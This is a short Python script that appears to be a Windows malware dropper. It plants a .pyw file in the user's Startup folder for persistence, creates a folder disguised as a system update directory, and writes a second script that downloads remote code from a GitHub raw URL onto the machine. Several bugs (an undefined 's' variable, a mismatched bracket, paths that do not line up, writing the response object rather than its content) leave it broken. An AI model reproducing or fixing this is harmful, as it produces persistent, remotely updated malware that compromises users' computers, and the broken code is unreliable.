import os
os.chdir("C:/Users/{}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/".format(s.getcwd().split("\\")[2]))
shortcut = open("sysrun.pyw", "w")
shortcut.write("exec('C:/Users/{}/AppData/Roaming/Microsoft/Windows/System/Update/update.pyw'.format(s.getcwd().split('\\\\'[2]))")
os.mkdir("../../../System")
os.chdir("../../../System")
os.mkdir("./Update")
os.chdir("./Update")
shortcut.close()
fl = open("update.pyw", "w")
fl.write("""
import urllib.request
f = urllib.request.urlopen('https://raw.githubusercontent.com/hless191/update/master/real.pyw')
cont = ""
for i in f:
    cont += i.decode()
fl = open("real.pyw", "w")
fl.write(f)
fl.close()
""")
